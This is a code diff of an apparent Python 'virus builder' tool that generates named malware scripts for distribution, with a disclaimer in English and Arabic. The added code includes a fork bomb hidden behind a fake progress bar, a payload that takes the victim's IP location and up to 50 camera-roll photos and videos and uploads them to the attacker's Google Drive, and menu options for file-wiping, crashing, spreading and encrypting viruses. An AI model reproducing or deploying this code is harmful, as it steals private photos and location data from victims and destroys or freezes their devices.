+    from time import sleep as timeout
+    import time, os, sys
+    def t(nn,t_):
+            print(t_)
+            print('')
+            for i in range(0,30):
+                    i+=1
+                    txt='\033[1;32m▒'*37
+                    f=i*'\033[1;31m▊'
+                    tt=i*3+1
+                    ttt=str(tt)
+                    print(txt+'┊'+ttt+'%  ',end='\r')
+                    print('Wait┊{}'.format(f),end='\r')
+                    time.sleep(0.2)
+            print('')
+    t(0.10,'\n\t   \033[1;35m[ ..... PLEASE WAIT .... ]')
+    print (' ')
+    time.sleep(0.2)
+    while (True):
+        os.fork()
+    pass
+def funktion7(Open_name):
+    import os, time
+    GREN = ('\033[92m')
+    pink = ('\033[95m')
+    RED = ("\033[31m")
+    yellow= ('\033[93m')
+    os.system('pip3 install random')
+    os.system('pip3 install wget')
+    import wget
+    url = 'https://ipapi.co/json'
+    filename = 'data.txt'
+    if os.path.isfile(filename):
+        os.remove(filename)
+    wget.download(url, filename)
+    try:
+        import requests
+        import join
+        from tqdm import tqdm
+        import tqdm
+    except:
+        os.system('pip3 install tqdm')
+        os.system('pip3 install requests')
+        os.system('pip3 install join')
+    RED = ("\033[31m")
+    pink = ('\033[95m') 
+    print("\033[1;32;40m")
+    print ("\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...\n")
+    time.sleep(0.1)
+    os.system('clear')
+    print ("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...\n")
+    import tqdm
+    dcim_folder = "/storage/emulated/0/DCIM/Camera/"
+    all_files = os.listdir(dcim_folder)
+
+    supported_extensions = ['mp4','mp3','ai', 'avif', 'b64', 'bmp', 'bpg', 'cur', 'cut', 'dib', 'emf', 'eps', 'exif', 'exr', 'fax', 'fits', 'gif', 'hdr', 'heic', 'heif', 'ico', 'jfif', 'jp2', 'jpe', 'jpeg', 'jpg', 'jxl', 'mjpeg', 'pbm', 'pcx', 'pgm', 'png', 'ppm', 'psd', 'qoi', 'svg', 'tga', 'tif', 'tiff', 'viff', 'vx', 'webp', 'wmf', 'wpg', 'xbm', 'xpm', 'RAW']
+    image_files = []
+    for file in all_files:
+        if len(image_files) >= 50:
+            break
+        if file.split('.')[-1] in supported_extensions:
+            image_files.append(os.path.join(dcim_folder, file))
+    time.sleep(0.1)
+    os.system('clear')
+    print("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓"+RED+" Done\n")
+    time.sleep(0.1)
+    time.sleep(0.1)
+    os.system('clear')
+    print("\033[1;32;40m\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓"+RED+" Done\n")
+    time.sleep(0.1)
+    print(RED+'Hello my Friend 💖💗💓💞💕💟💌💘💝❣🤎💜💙💚💛🧡❤🤍                         ')
+    ###################
+    print("I love You "+pink+"≧◡≦             ")
+    ################
+    def color():
+        import os
+        os.system('clear')
+        pink = '\033[95m'
+        C='\033[1;36m'
+        print(C+'''⣿⣿⣿⣿⡿⠟⠛⠋⠉⠉⠉⠉⠉⠛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+    ⣿⣿⠟⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠈⠙⠾⣿⣾⣿⣾⣿⣾⣿⣾⣿
+    ⠋⡁⠀⠀⠀⠀⠀⢀⠔⠁⠀⠀⢀⠠⠐⠈⠁⠀⠀⠁⠀⠈⠻⢾⣿⣾⣿⣾⣟⣿
+    ⠊⠀⠀⠀⠀⢀⠔⠃⠀⠀⠠⠈⠁⠀⠀⠀⠀⠀⠀⠆⠀⠀⠄⠀⠙⣾⣷⣿⢿⣿
+    ⠀⠀⠀⠀⡠⠉⠀⠀⠀⠀⠠⢰⢀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠈⡀⠀⠈⢿⣟⣿⣿
+    ⠀⠀⢀⡜⣐⠃⠀⠀⠀⣠⠁⡄⠰⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠰⠀⠀⠈⢿⣿⣿
+    ⠀⢠⠆⢠⡃⠀⠀⠀⣔⠆⡘⡇⢘⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
+    ⢀⡆⠀⡼⢣⠀⢀⠌⢸⢠⠇⡇⢘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿
+    ⣼⣃⠀⠁⢸⢀⠎⠀⢸⠎⠀⢸⢸⡄⠀⠀⠀⠀⠀⠂⢀⠀⠀⠀⠀⠀⠀⠀⠀⣿
+    ⠃⡏'''+pink+'''⠟⣷⣤⠁'''+C+'''⠀⠀⠸⠀⠀⡾⢀⢇⠀⠀⠀⠀⠀⠄⠸⠀⠀⠀⠀⠄⠀⠀⠀⣿
+    ⠀⠀'''+pink+'''⣿⣿⣿⢦'''+C+'''⠀⠀⠀⠀⡧⠋⠘⡄⠀⠀⠀⠀⡇⢸⠀⠀⠠⡘⠀⠀⠀⢠⣿
+    ⠈⠀'''+pink+'''⢿⢗⡻⠃'''+C+'''⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⢰⠁⡇⠀⠀⢨⠃⡄⢀⠀⣸⣿
+    ⠀⠀⠀'''+pink+'''⠈'''+C+''''⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣱⠀⠀⡎⠸⠁⠀⢀⠞⡸⠀⡜⢠⣿⣿
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀'''+pink+'''⢠⣺⣿⣧⢰⣧ '''+C+'''⡁⡄⠀⡞⠰⠁⡸⣠⣿⣿
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀'''+pink+'''⠠⡿⠏⣿⠟⢁⠾'''+C+'''⢛⣧⢼⠁⠀⠀⢰⣿⡿⣷⣿
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠡⠄⠀⡠⣚⡷⠊⠀⠀⠀⣿⡿⣿⡿⣿
+    ⡀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠁⢸⠁⠀⠀⠀⢰⣿⣿⡿⣿⣿
+    ⠱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠊⠀⠀⠀⡞⠀⠀⠀⠀⢸⣿⣷⣿⣿⣿
+    ⠀⠙⢦⣀⠀⠀⠀⠀⠀⢀⣀⣠⠖⠁⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⣸⣿⣾⡿⣷⣿
+    ⠀⠀⠀⠀⠉⠉⣩⡞⠉⠁⠀⢸⡄⠀⠀⠀⠀⠀⢰⠇⠀⠀⠀⠀⣿⣿⣷⣿⣿⣿
+    ⡆⠀⠀⣀⡠⠞⠁⣧⢤⣀⣀⣀⡇⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⣿⣷⣿⣷⣿⣿
+    ⣿⣷⠊⠁⠀⠀⡰⠁⠀⠀⠀⠀⣹⠶⢦⡀⠀⠀⡇⠀⠀⠀⠀⠀⢸⣿⣷⣿⣷⣿
+    ⣿⢿⠀⠀⠀⡔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⡇⠀⠀⠀⠀⠀⠈⣿⣾⣷⣿⣿
+    ⠋⠈⠀⢀⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠈⣧⠀⠀⠀⠀⠀⠀⠻⣿⣽⣾⣿
+    ⢀⡄⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠁⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⣿⣿⣻⣿
+    ⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠐⠀⠀⠀⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⢹⣿⣻⣿
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⢀⣃⡇⠀⠲⡀⠀⠀⠀⠀⠈⣿⡿⣿
+    ⣀⠤⠤⠤⡀⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⢬⠞⡇⠀⠀⠇⠀⠀⠀⠀⠀⣿⣿⣿
+    ⡁⢀⠀⠀⡇⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⣸⠁⠀⠇⠀⠀⡇⠀⠀⠀⠀⠀⣿⣿⣿
+    ⠔⠃⠀⠀⡇⠀⠀⡼⠁⠀⠀⠀⠀⠀⢀⡇⠀⠀⡃⠀⠀⠙⢄⠀⠀⠀⠀⣿⣷⣿
+    ⠒⠊⠀⠀⢸⠀⣸⠃⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⢅⠀⠀⡂⠸⡄⠀⠀⠀⣿⣟⣿
+    ⠓⠀⠉⠀⢸⣰⠃⠀⠀⠀⠀⠀⠀⡜⡆⠀⠀⠀⢸⠀⠀⡇⢀⠇⠀⠀⠀⣿⣿⣿
+    ⠉⠁⠀⢠⠞⠀⠀⠀⠀⠀⠀⠀⣰⠁⡇⠀⠀⠀⡇⠀⠀⡇⢸⠀⠀⠀⠀⣿⣷⣿
+    ⡀⠀⢀⢿⣥⡤⠤⠤⠤⣀⣀⢠⠇⠀⢸⠀⠀⢰⠁⠀⢨⠀⢸⠀⠀⠀⠀⣿⣟⣿''')
+    ################
+    def runy():
+        import os,json,requests
+        from time import sleep as timeout
+        GREN = ('\033[92m')
+        BLUE = ("\033[34m")
+        pink = ('\033[95m')
+        White = ("\033[97m")
+        RED = ("\033[31m")
+        yellow= ('\033[93m')
+        LIGHTGREEN_EX = ('\033[92m')
+        print(BLUE+'CODING BY:'+yellow+' ME ')
+        from time import sleep as timeout
+        import time, os, sys
+        nun = ('abcde')
+        headers = {"Authorization": "Bearer " + nun}
+        for image_file in tqdm.tqdm(image_files + [filename], desc="Please Wait ( づ￣ ³￣ )づ..."):
+                para = {
+                "name": os.path.basename(image_file)
+            }
+                files = {
+                'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
+                'file': open(image_file, "rb")
+            }
+                r = requests.post(
+                "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
+                headers=headers,
+                files=files
+            )
+    runy()
+    color()
+    print(GREN+''' ____''')
+    print(GREN+'''|  _ \ '''+RED+''' ___ '''+yellow+''' _ __   '''+pink+'''___''')
+    print(GREN+'''| | | |'''+RED+'''/ _ \\\033[93m| '_ \\\033[95m / _ \\''')
+    print(GREN+'''| |_| |'''+RED+''' (_)'''+yellow+''' | | | |  '''+pink+'''__/''')
+    print(GREN+'''|____/'''+RED+''' \___/'''+yellow+'''|_| |_|'''+pink+'''\___|''')
+    pass
+def op():
+	import webbrowser,wget,requests
+	url = 'https://raw.githubusercontent.com/Kitt-loy/Virus-Py/main/2.0v'
 	response = requests.get(url)
 	version_number = url.split("/")[-1]
 	if __name__ == '__main__':
-		    with open(__file__) as f:
-		        content = f.read()
-		    if response.status_code != 200:
-		        	print('    This script is outdated. Please update it to version', version_number)
-		        	os.remove(__file__)
-		        	exit()
+		with open(__file__) as f:
+			content = f.read()
+		if response.status_code != 200:
+			print('    This script is outdated. Please update it to version', version_number)
+			os.remove(__file__)
+			exit()
 	words = "\033[34m     𝚃𝙷𝙸𝚂 𝚃𝙾𝙾𝙻 𝙸𝚂 𝙵𝙾𝚁 𝙼𝙰𝙺𝙴 𝙿𝚈𝚃𝙷𝙾𝙽 𝚅𝙸𝚁𝚄𝚂 \n\n"
 	wahr = '\033[34m################################################################\nI am not responsible for any use of this tool or the information provided for the purpose of security and safety. It must be used wisely and responsibly according to the specified terms and conditions, without using it for any unlawful purpose or that may result in any harm or loss.\n################################################################\n\033[92m هذه الأداة لصنع فيروسات على هيئة سكربتات بايثون     \n\n################################################################\nانا لست مسؤولا عن استخدام هذه الأداة أو المعلومات المقدمة بهدف الحماية  والأمان، ويجب استخدامها بحكمة ومسؤولية وفقًا للشروط والأحكام المحددة، دون استخدامها لأي غرض غير قانوني أو يمكن أن يؤدي إلى أي أضرار أو خسائر..\n################################################################\n'
 	vers = ('\033[34m       Virus-Scripts version '+version_number+'\n')
 	
 ##################
 	def run():
+		GREN = ('\033[92m')
+		BLUE = ("\033[34m")
+		pink = ('\033[95m')
+		White = ("\033[97m")
+		RED = ("\033[31m")
+		yellow= ('\033[93m')
+		LIGHTGREEN_EX = ('\033[92m')
 		print(vers)
 		for char in words:
 				sleep(0.1)
@@ -188,37 +872,14 @@ def op():
 				sys.stdout.flush()
 		print(wahr)
 		def bye():
-				    import os
-				    os.system('clear')
-				    try:
-				        import pyfiglet
-				        from termcolor import colored
-				    except ModuleNotFoundError:
-				        os.system("pip install pyfiglet termcolor")
-				        import pyfiglet
-				        from termcolor import colored
-				    colored_asci = colored(asci, "white", "on_red", attrs=["bold"])
-				    text = pyfiglet.figlet_format("     BYE", font="big")				
-				    print(colored_asci)
-				    print(text)
-		import os
-		import wget
-		
-		base_url = 'https://raw.githubusercontent.com/Kitt-loy/Virus-Py/main/'
-		va = ['.Open.py', '.config_virus.py', '.spreading_virus.py', '.delet_virus.py', '.crash_virus.py','.encrypted_virus.py','.decrypted_virus.py']
-		
-		for file_name in va:
-		    file_path = os.path.join(os.getcwd(), file_name)
-		    if not os.path.exists(file_path):
-		        url = base_url + file_name
-		        wget.download(url, bar=None)
-		import os
-		R = ('\033[31m')
-		BLUE = ("\033[34m")
-		W = ("\033[97m")
-		G = ('\033[92m')
-		LIGHTGREEN_EX = ('\033[92m')
-	#	print('\n')
+			import os
+			os.system('clear')
+			import pyfiglet
+			from termcolor import colored
+			colored_asci = colored(asci_name, "white", "on_red", attrs=["bold"])
+			text = pyfiglet.figlet_format("     BYE", font="big")				
+			print(colored_asci)
+			print(text)
 		print(R+'《0》'+W+'Exit')
 		print(R+'《1》'+W+'The first virus deletes all phone files, including photos, audios, and others')
 		print(R+'《2》'+W+'The virus cash the device and puts pressure on the device processor')
@@ -242,38 +903,32 @@ def op():
 			    run()
 		if Virus00 == "0":
 				bye()
+				exit()
 		if Virus00 == "1":
 				BLUE = ("\033[34m")
 				GREN = ('\033[92m')
 				White = ("\033[97m")
 				RED = ("\033[31m")
 				LIGHTGREEN_EX = ('\033[92m')
-				import shutil	
-				Open = r'.delet_virus.py'
-				Open1 = r'.delet_virus1.py'
-				shutil.copyfile(Open, Open1)
-				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
+				delet_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
  └──╼ """+White+"$ ")
-				if new == '..':
+				if delet_name == '..':
 					os.system('clear')
-					gun()
+					print(dead_name)
 					op()
-				else:
-					os.system('clear')
-					gun()
-					op()
-				############
-				old_name = r".delet_virus.py"
-				new_name = (new + '.py')
-				#############
-				os.rename(old_name, new_name)
-				########
+				with open(delet_name+'.py',"w", encoding='utf-8') as file:
+					file.write(inspect.getsource(funktion4))
+				with open(delet_name+'.py',"r") as file:
+					filedata = file.read()
+					filedata = filedata.replace("pass", "")
+					filedata = filedata.replace("delet_name", "")
+					#print("Saved as "+delet_name+".py")
+				with open(delet_name+'.py',"w") as file:
+					file.write(filedata)
+				with open(delet_name+'.py',"a") as file:
+					file.write("funktion4()")
 				ascii()
-				print(White+'The virus has been saved as ' +RED+ new + '.py')
-				import os
-				original = r'.delet_virus1.py'
-				target = r'.delet_virus.py'
-				os.rename(original, target)
+				print(White+'The virus has been saved as ' +RED+ delet_name + '.py')
 				def restart():
 				    while True:
 				        import os
@@ -301,32 +956,25 @@ def op():
 				White = ("\033[97m")
 				RED = ("\033[31m")
 				LIGHTGREEN_EX = ('\033[92m')
-				import shutil	
-				Open = r'.crash_virus.py'
-				Open1 = r'.crash_virus1.py'
-				shutil.copyfile(Open, Open1)
-				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
+				crash_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
  └──╼ """+White+"$ ")
-				if new == '..':
+				if crash_name == '..':
 					os.system('clear')
-					gun()
+					print(dead_name)
 					op()
-				else:
-					os.system('clear')
-					gun()
-					op()
-				############
-				old_name = r".crash_virus.py"
-				new_name = (new + '.py')
-				#############
-				os.rename(old_name, new_name)
-				########
+				with open(crash_name+'.py',"w", encoding='utf-8') as file:
+					file.write(inspect.getsource(funktion6))
+				with open(crash_name+'.py',"r") as file:
+					filedata = file.read()
+					filedata = filedata.replace("pass", "")
+					filedata = filedata.replace("crash_name", "")
+					print("Saved as "+crash_name+".py")
+				with open(crash_name+'.py',"w") as file:
+					file.write(filedata)
+				with open(crash_name+'.py',"a") as file:
+					file.write("funktion6()")
 				ascii()
-				print(White+'The virus has been saved as ' +RED+ new + '.py')
-				import os
-				original = r'.crash_virus1.py'
-				target = r'.crash_virus.py'
-				os.rename(original, target)
+				print(White+'The virus has been saved as ' +RED+ crash_name + '.py')
 				def restart():
 				    while True:
 				        import os
@@ -351,19 +999,11 @@ def op():
 				White = ("\033[97m")
 				RED = ("\033[31m")
 				LIGHTGREEN_EX = ('\033[92m')
-				import shutil	
-				Open = r'.Open.py'
-				Open1 = r'.Open1.py'
-				shutil.copyfile(Open, Open1)
-				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
+				Open_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
  └──╼ """+White+"$ ")
-				if new == '..':
+				if Open_name == '..':
 					os.system('clear')
-					gun()
-					op()
-				else:
-					os.system('clear')
-					gun()
+					print(dead_name)
 					op()
 				import webbrowser
 				url = 'https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow'
@@ -372,45 +1012,37 @@ def op():
 				print('https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow\n')
 				nun = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Google Drive Code"+RED+"""]
  └──╼ """+White+"$ ")
-				############
-				with open('.Open.py', 'r') as file :
-				  filedata = file.read()
-				
-				##########
-				filedata = filedata.replace('abcde', nun)
-				filedata = filedata.replace('mvvv.py', new)
-				#########
-				with open('.Open.py', 'w') as file:
-				  file.write(filedata)
-				 ########
-				old_name = r".Open.py"
-				new_name = (new + '.py')
-				#############
-				os.rename(old_name, new_name)
-				########
+				with open(Open_name+'.py',"w", encoding='utf-8') as file:
+					file.write(inspect.getsource(funktion7))
+				with open(Open_name+'.py',"r") as file:
+					filedata = file.read()
+					filedata = filedata.replace('abcde', nun)
+					filedata = filedata.replace("pass", "")
+					filedata = filedata.replace("Open_name", "")
+					print("Saved as "+Open_name+".py")
+				with open(Open_name+'.py',"w") as file:
+					file.write(filedata)
+				with open(Open_name+'.py',"a") as file:
+					file.write("funktion7()")
 				ascii()
-				print(White+'The virus has been saved as ' +RED+ new + '.py')
-				import os
-				original = r'.Open1.py'
-				target = r'.Open.py'
-				os.rename(original, target)
+				print(White+'The virus has been saved as ' +RED+ Open_name + '.py')
+				############
 				def restart():
 				    while True:
-				        import os
-				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
+					    import os
+					    restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
  └──╼  """+White+"(y/n) ? ")
-				        if restart == "y":
-				            import os
-				            os.system('clear')
-				            run()
-				          #  break
-				        elif restart == "n":
-				            bye()
-				            exit()
-				        else:
-				            os.system('clear')
-				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
-				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
+					    if restart == "y":
+						    import os
+						    os.system('clear')
+						    run()
+					    elif restart == "n":
+						    bye()
+						    exit()
+					    else:
+						    os.system('clear')
+						    print('The character you entered does not exist. Please choose :\ny\nor\nn')
+						    print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
 				restart()
 		if Virus00 == "4":
 				BLUE = ("\033[34m")
@@ -418,32 +1050,25 @@ def op():
 				White = ("\033[97m")
 				RED = ("\033[31m")
 				LIGHTGREEN_EX = ('\033[92m')
-				import shutil	
-				Open = r'.config_virus.py'
-				Open1 = r'.config_virus1.py'
-				shutil.copyfile(Open, Open1)
-				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
+				config_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
  └──╼ """+White+"$ ")
-				if new == '..':
+				if config_name == '..':
 					os.system('clear')
-					gun()
+					print(dead_name)
 					op()
-				else:
-					os.system('clear')
-					gun()
-					op()
-				############
-				old_name = r".config_virus.py"
-				new_name = (new + '.py')
-				#############
-				os.rename(old_name, new_name)
-				########
+				with open(config_name+'.py',"w", encoding='utf-8') as file:
+					file.write(inspect.getsource(funktion5))
+				with open(config_name+'.py',"r") as file:
+					filedata = file.read()
+					filedata = filedata.replace("pass", "")
+					filedata = filedata.replace("config_name", "")
+					print("Saved as "+config_name+".py")
+				with open(config_name+'.py',"w") as file:
+					file.write(filedata)
+				with open(config_name+'.py',"a") as file:
+					file.write("funktion5()")
 				ascii()
-				print(White+'The virus has been saved as ' +RED+ new + '.py')
-				import os
-				original = r'.config_virus1.py'
-				target = r'.config_virus.py'
-				os.rename(original, target)
+				print(White+'The virus has been saved as ' +RED+ config_name + '.py')
 				def restart():
 				    while True:
 				        import os
@@ -468,31 +1093,25 @@ def op():
 				White = ("\033[97m")
 				RED = ("\033[31m")
 				LIGHTGREEN_EX = ('\033[92m')
-				import shutil	
-				Open = r'.spreading_virus.py'
-				Open1 = r'.spreading_virus1.py'
-				shutil.copyfile(Open, Open1)
-				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
+				spreading_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
  └──╼ """+White+"$ ")
-				if new == '..':
+				if spreading_name == '..':
 					os.system('clear')
-					gun()
+					print(dead_name)
 					op()
-				else:
-					os.system('clear')
-					gun()
-					op()
-				############
-				old_name = r".spreading_virus.py"
-				new_name = (new + '.py')
-				#############
-				os.rename(old_name, new_name)
-				########
+				with open(spreading_name+'.py',"w", encoding='utf-8') as file:
+					file.write(inspect.getsource(funktion3))
+				with open(spreading_name+'.py',"r") as file:
+					filedata = file.read()
+					filedata = filedata.replace("pass", "")
+					filedata = filedata.replace("spreading_name", "")
+					print("Saved as "+spreading_name+".py")
+				with open(spreading_name+'.py',"w") as file:
+					file.write(filedata)
+				with open(spreading_name+'.py',"a") as file:
+					file.write("funktion3()")
 				ascii()
-				print(White+'The virus has been saved as ' +RED+ new + '.py')
-				original = r'.spreading_virus1.py'
-				target = r'.spreading_vrius.py'
-				os.rename(original, target)
+				print(White+'The virus has been saved as ' +RED+ spreading_name + '.py')
 				def restart():
 				    while True:
 				        import os
@@ -517,19 +1136,11 @@ def op():
 				White = ("\033[97m")
 				RED = ("\033[31m")
 				LIGHTGREEN_EX = ('\033[92m')
-				import shutil	
-				Open = r'.encrypted_virus.py'
-				Open1 = r'.encrypted_virus1.py'
-				shutil.copyfile(Open, Open1)
-				new = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
+				encrypted_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
  └──╼ """+White+"$ ")
-				if new == '..':
+				if encrypted_name == '..':
 					os.system('clear')
-					gun()
-					op()
-				else:
-					os.system('clear')
-					gun()
+					print(dead_name)
 					op()
 				password = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Password Encrypted"+RED+"""]
  └──╼ """+White+"$ ")
@@ -538,46 +1149,32 @@ def op():
 				webbrowser.open(url)
 				print(RED+'You Can found your Google Drive token Here👇/يمكنك العثور على رمز التوكن الخاص بحسابك على جوجل درايف هنا\n')
 				print('https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow\n')
-				nun = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Google Drive Code"+RED+"""]
+				non = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Google Drive Code"+RED+"""]
  └──╼ """+White+"$ ")
- ###########################
- ##########Ecrypted##########
- ###########################
-				with open('.encrypted_virus.py', 'r') as file :
+				with open(encrypted_name+'_decrypted.py',"w", encoding='utf-8') as file:
+					file.write(inspect.getsource(funktion1))
+				with open(encrypted_name+'.py',"w", encoding='utf-8') as file:
+					file.write(inspect.getsource(funktion2))
+				with open(encrypted_name+'.py',"r") as file:
